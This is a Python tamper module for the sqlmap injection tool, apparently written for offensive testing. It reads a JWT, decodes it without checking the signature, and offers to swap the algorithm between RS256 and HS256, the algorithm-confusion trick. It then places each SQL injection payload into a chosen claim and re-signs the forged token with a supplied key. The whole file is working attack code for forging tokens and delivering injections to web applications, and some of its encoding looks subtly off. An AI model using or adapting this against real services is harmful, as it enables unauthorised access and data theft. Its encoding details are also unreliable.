#!/usr/bin/env python
from lib.core.data import conf
from lib.core.common import singleTimeLogMessage, readInput, setColor
from lib.core.enums import PRIORITY
from base64 import b64encode, b64decode
import jwt
import json
import hmac

__priority__ = PRIORITY.NORMAL



def dependencies():    
	pass




def tamper(payload, **kwargs):

	if not conf.get("jwt_payload"):
		file = readInput("[jwtamper] Enter jwt token file [token.jwt]: ")
		if(len(file) == 0):
			file = "token.jwt"
		
		f = open(file, 'r')
		token = f.read()
		singleTimeLogMessage("JWT: %s" % setColor(token, color="blue", istty = True))

		# Not sure if thats always the case...
		token = token + "==" 

		jwtpayload = jwt.decode(token, options = {"verify_signature": False})
		conf.jwt_payload = jwtpayload


		jwtheader = jwt.get_unverified_header(token)

		singleTimeLogMessage("JWT Header: %s" % str(jwtheader))
		singleTimeLogMessage("JWT Payload: %s" % str(jwtpayload))

		newalg = ""
		qs = "[jwtamper] Current alg is: " + jwtheader['alg'] + "\n"
		if(jwtheader['alg'] == "RS256"):
			newalg = "HS256"
		else:
			newalg = "RS256"

		qs = qs + "1) Change to " + newalg + "\n"
		qs = qs + "2) Don't change [default]"

		ch = readInput(qs)
		if not ch:
			ch = 2
		else:
			ch = int(ch)

		if(ch == 1):
			jwtheader['alg'] = newalg
			singleTimeLogMessage("Modified JWT Header: %s" % str(jwtheader))

		conf.jwt_header = jwtheader

		ct = 1
		qs = "[jwtamper] Select param to attack: \n" 
		for arg in jwtpayload:
				qs = qs + str(ct) + ") " + arg + "\n"
				ct = ct + 1
		qs = qs[:-1]

		ch = -1
		while(ch < 1 or ch > ct - 1):
			ch = readInput(qs)
			if not ch:
				ch = -1
			else:
				ch = int(ch)

		key = [k for k in jwtpayload.keys()][ch - 1]
		singleTimeLogMessage("Attacking: %s" % key)
		conf.key_to_attack = key

		file = readInput("[jwtamper] Enter secret/key file [key.jwt]: ")
		if(len(file) == 0):
			file = "key.jwt"
		
		f = open(file, 'r')
		secret = f.read()
		singleTimeLogMessage("KEY: %s" % setColor(secret, color="green", istty = True))
		conf.secret_key = secret


	conf.jwt_payload[conf.key_to_attack] = payload


	hdr = json.dumps(conf.jwt_header).encode("utf-8")
	hdr = b64encode(hdr).decode().rstrip('=')

	pl = json.dumps(conf.jwt_payload).encode("utf-8")
	pl = b64encode(pl).decode().rstrip('=')

	hd = hdr + "." + pl
	hd = hd.encode("utf-8")

	sig = hmac.new(conf.secret_key.encode("utf-8"), msg=hd, digestmod='sha256')
	sig = b64encode(sig.digest())
	sig = sig.decode().replace('/', '_').replace('+', '-').strip('=')
	sig = sig.encode("utf-8")
 
	ret = hd + b'.' + sig


	# singleTimeLogMessage("Modified JWT Header: %s" % str(payload))


	
	return ret.decode()


